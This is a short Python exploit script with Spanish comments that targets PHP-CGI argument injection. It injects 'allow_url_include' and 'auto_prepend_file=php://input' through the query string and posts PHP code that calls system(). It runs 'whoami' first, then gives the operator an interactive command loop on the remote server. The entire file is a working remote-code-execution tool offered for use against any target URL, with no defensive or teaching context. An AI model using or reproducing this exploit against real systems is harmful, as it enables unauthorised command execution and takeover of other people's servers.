#! /usr/bin/env python3
# _*_ coding: utf8_*_

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t', '--target', help="INTRODUCE UN OBJETIVO")
parser = parser.parse_args()


def main():
    if parser.target:
        vul = "/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"
        target = parser.target
        if not target.startswith('http://'):
            target = 'http://' + target
        try:
            exploit = requests.post(target + vul, "<?php system('whoami'); die(); ?>")
            user = exploit.text
            user = user.replace(
                "\n", ""
            )  # Con replace podemos cambiar unos caracteres por otros cuando se encuentren en una cadena de texto o en una lista
            try:
                while True:
                    comando = input(
                        ''' ---[{}$]
 '
 '--->'''.format(
                            user
                        )
                    )
                    exploit = requests.post(
                        target + vul, "<?php system('{}'); die();?>".format(comando)
                    )
                    print(exploit.text)
            except KeyboardInterrupt:
                sys.exit(0)
        except:
            print('SALIDA MANUAL')
    else:
        print('Introduce un objetivo')


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        exit()
